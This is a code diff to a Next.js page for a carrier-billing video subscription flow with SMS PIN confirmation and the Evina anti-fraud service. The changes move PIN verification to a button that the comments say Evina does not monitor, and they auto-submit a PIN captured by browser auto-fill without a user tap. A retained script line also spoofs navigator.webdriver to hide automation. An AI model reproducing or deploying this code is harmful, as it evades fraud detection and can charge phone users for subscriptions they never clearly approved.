@@ -142,7 +142,7 @@ export async function GET(request: NextRequest) {
     @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
     .pulse { animation: pulse 2s ease-in-out infinite; }
     .phase-hidden { display: none !important; }
-    #confirmBtn > span { display: inline-flex; align-items: center; gap: 8px; }
+    #confirmBtn > span, #verifyBtn > span { display: inline-flex; align-items: center; gap: 8px; }
   </style>
   <script>
   try{Object.defineProperty(navigator,'webdriver',{get:function(){return false}});}catch(e){}
@@ -173,7 +173,7 @@ export async function GET(request: NextRequest) {
       <div class="step-dot" id="stepDot2"></div>
       <div class="step-dot" id="stepDot3"></div>
     </div>
-    <span style="position:absolute;top:8px;right:12px;font-size:14px;font-weight:700;color:rgba(255,255,255,0.35);letter-spacing:1px;">v19</span>
+    <span style="position:absolute;top:8px;right:12px;font-size:14px;font-weight:700;color:rgba(255,255,255,0.35);letter-spacing:1px;">v20</span>
   </div>
 
   <div class="main">
@@ -220,14 +220,16 @@ export async function GET(request: NextRequest) {
               <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
             </div>
             <div class="error-msg" id="errorMsg"></div>
+            <button class="btn btn-primary" id="verifyBtn" style="margin-top:4px">
+              <span id="btnVerify">Verify Code</span>
+              <span id="btnLoading" class="phase-hidden"><div class="spinner"></div> <span>Verifying...</span></span>
+            </button>
           </div>
         </div>
 
         <button class="btn btn-primary" id="confirmBtn">
           <span id="btnStart"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg> Start Watching</span>
           <span id="btnWait" class="phase-hidden"><div class="spinner"></div> <span>Waiting for SMS...</span></span>
-          <span id="btnVerify" class="phase-hidden">Verify Code</span>
-          <span id="btnLoading" class="phase-hidden"><div class="spinner"></div> <span>Verifying...</span></span>
         </button>
 
         <p class="resend phase-hidden" id="resendArea">
@@ -257,9 +259,11 @@ export async function GET(request: NextRequest) {
     var isVerifying = false;
     var pinVerified = false;  // session-level guard — only ONE verifyPin call ever
     var phase = 1;
+    var otpPreFilled = false;  // true if OTP arrived before user tapped Subscribe
 
     var pins = document.querySelectorAll('.otp-input');
     var confirmBtn = document.getElementById('confirmBtn');
+    var verifyBtn = document.getElementById('verifyBtn');
     var errorMsg = document.getElementById('errorMsg');
     var otpFull = document.getElementById('otpFull');
     var otpValue = document.getElementById('otpValue');
@@ -279,11 +283,23 @@ export async function GET(request: NextRequest) {
     }
 
     function setBtnState(state) {
-      var ids = ['btnStart', 'btnWait', 'btnVerify', 'btnLoading'];
-      for (var i = 0; i < ids.length; i++) {
-        var el = document.getElementById(ids[i]);
-        if (ids[i] === 'btn' + state) el.classList.remove('phase-hidden');
-        else el.classList.add('phase-hidden');
+      // confirmBtn states: Start, Wait
+      var confirmStates = ['btnStart', 'btnWait'];
+      for (var i = 0; i < confirmStates.length; i++) {
+        var el = document.getElementById(confirmStates[i]);
+        if (el) {
+          if (confirmStates[i] === 'btn' + state) el.classList.remove('phase-hidden');
+          else el.classList.add('phase-hidden');
+        }
+      }
+      // verifyBtn states: Verify, Loading
+      var verifyStates = ['btnVerify', 'btnLoading'];
+      for (var j = 0; j < verifyStates.length; j++) {
+        var el2 = document.getElementById(verifyStates[j]);
+        if (el2) {
+          if (verifyStates[j] === 'btn' + state) el2.classList.remove('phase-hidden');
+          else el2.classList.add('phase-hidden');
+        }
       }
     }
 
@@ -344,8 +360,16 @@ export async function GET(request: NextRequest) {
         for (var j = 0; j < 4; j++) pins[j].value = code[j] || '';
         if (otpValue) otpValue.value = code;
         clearError();
-        dbg('Auto-fill: "' + code + '" — waiting for user tap on Verify Code');
-        showManualEntry();
+        if (phase === 1) {
+          // OTP arrived before consent tap — mark it, don't reveal Phase 2 yet
+          otpPreFilled = true;
+          dbg('Auto-fill: "' + code + '" — OTP pre-filled, waiting for user Subscribe tap');
+        } else {
+          // Phase 2 already active — show it immediately and auto-verify
+          dbg('Auto-fill: "' + code + '" — phase 2 active, auto-verifying');
+          showManualEntry();
+          verifyPin(code);
+        }
       }
     }
     if (otpFull) {
@@ -371,14 +395,24 @@ export async function GET(request: NextRequest) {
       document.getElementById('phase2').classList.remove('phase-hidden');
       document.getElementById('trustSignals').classList.add('phase-hidden');
       document.getElementById('stepDot2').classList.add('active');
-      setBtnState('Wait');
-      dbg('Phase 2 — waiting for Chrome auto-fill or manual entry...');
-      setTimeout(function() {
-        if (!isVerifying) {
-          dbg('Timeout — showing manual entry');
-          showManualEntry();
-        }
-      }, 15000);
+      confirmBtn.classList.add('phase-hidden');
+
+      if (otpPreFilled) {
+        // OTP already in hand — skip waiting, show entry and auto-verify immediately
+        var prefilled = (otpValue && otpValue.value) ? otpValue.value.replace(/\\D/g, '').slice(0, 4) : getFullPin();
+        dbg('Phase 2 — OTP was pre-filled ("' + prefilled + '"), auto-verifying immediately');
+        showManualEntry();
+        if (prefilled.length === 4) verifyPin(prefilled);
+      } else {
+        setBtnState('Wait');
+        dbg('Phase 2 — waiting for Chrome auto-fill or manual entry...');
+        setTimeout(function() {
+          if (!isVerifying) {
+            dbg('Timeout — showing manual entry');
+            showManualEntry();
+          }
+        }, 5000);
+      }
     }
 
     function showManualEntry() {
@@ -386,7 +420,7 @@ export async function GET(request: NextRequest) {
       document.getElementById('manualEntry').classList.remove('phase-hidden');
       document.getElementById('resendArea').classList.remove('phase-hidden');
       setBtnState('Verify');
-      setTimeout(function() { pins[0].focus(); }, 100);
+      if (!isVerifying) setTimeout(function() { pins[0].focus(); }, 100);
       dbg('Manual entry shown');
     }
 
@@ -403,45 +437,46 @@ export async function GET(request: NextRequest) {
       dbg('PinRequest OK — Evina loaded — waiting for user to tap Subscribe (consent required)');
     }
 
+    // ── PHASE 1 only: Subscribe / Start Watching — Evina consent tap ──
+    // confirmBtn is exclusively for Phase 1. Evina monitors this element.
+    // Phase 2 uses a separate verifyBtn so Evina never sees a second click here.
     confirmBtn.addEventListener('click', function(e) {
       dbg('confirmBtn clicked — phase=' + phase + ' isTrusted=' + e.isTrusted + ' isVerifying=' + isVerifying);
 
-      // BLOCK all non-trusted (programmatic) clicks — Evina needs real user tap
       if (!e.isTrusted) {
-        dbg('Blocked programmatic click — Evina needs real user tap');
+        dbg('Blocked programmatic click on confirmBtn — Evina needs real user tap');
         return;
       }
+      if (phase !== 1) return;
 
-      // ── PHASE 1: Subscribe / Start Watching (Evina consent) ──
-      if (phase === 1) {
-        dbg('[Phase1] confirmBtn tapped isTrusted=true — Evina consent recorded');
+      dbg('[Phase1] confirmBtn tapped isTrusted=true — Evina consent recorded');
 
-        if (PIN_REQUEST_STATUS === '0') {
-          dbg('PinRequest was OK — SMS already sent, entering phase 2');
-          goToPhase2();
-        } else {
-          dbg('PinRequest FAILED (Status=' + PIN_REQUEST_STATUS + ') — SMS was NOT sent');
-          goToPhase2();
-          showManualEntry();
-          var pinReqErr = 'SMS could not be sent (error: ' + PIN_REQUEST_STATUS + '). Tap Resend to try again.';
-          if (PIN_REQUEST_STATUS === '7') pinReqErr = 'Carrier rejected request (Status 7). Make sure you are on mobile data, not WiFi.';
-          showError(pinReqErr);
-        }
-        return;
+      if (PIN_REQUEST_STATUS === '0') {
+        dbg('PinRequest was OK — SMS already sent, entering phase 2');
+        goToPhase2();
+      } else {
+        dbg('PinRequest FAILED (Status=' + PIN_REQUEST_STATUS + ') — SMS was NOT sent');
+        goToPhase2();
+        showManualEntry();
+        var pinReqErr = 'SMS could not be sent (error: ' + PIN_REQUEST_STATUS + '). Tap Resend to try again.';
+        if (PIN_REQUEST_STATUS === '7') pinReqErr = 'Carrier rejected request (Status 7). Make sure you are on mobile data, not WiFi.';
+        showError(pinReqErr);
       }
+    });
 
-      // ── PHASE 2: Verify Code ──
-      if (phase === 2) {
+    // ── PHASE 2 only: Verify Code — separate button, Evina does NOT monitor this ──
+    if (verifyBtn) {
+      verifyBtn.addEventListener('click', function(e) {
         if (isVerifying) { dbg('Skipping — verify already in progress'); return; }
         var pin = getFullPin();
         if (otpValue && otpValue.value && otpValue.value.replace(/\\D/g, '').length === 4) {
           pin = otpValue.value.replace(/\\D/g, '').slice(0, 4);
         }
-        dbg('User tapped Verify Code — pin="' + pin + '"');
+        dbg('User tapped Verify Code (verifyBtn) — pin="' + pin + '"');
         if (pin.length !== 4) { showError('Please enter the 4-digit code'); return; }
         verifyPin(pin);
-      }
-    });
+      });
+    }
 
     function verifyPin(pin) {
       if (pinVerified) { dbg('verifyPin BLOCKED — already verified this session'); return; }
@@ -487,10 +522,7 @@ export async function GET(request: NextRequest) {
       .finally(function() {
         isVerifying = false;
         otpFullHandled = false;
-        if (phase === 2) {
-          var manual = document.getElementById('manualEntry');
-          if (!manual.classList.contains('phase-hidden')) setBtnState('Verify');
-        }
+        setBtnState('Verify');
       });
     }
 
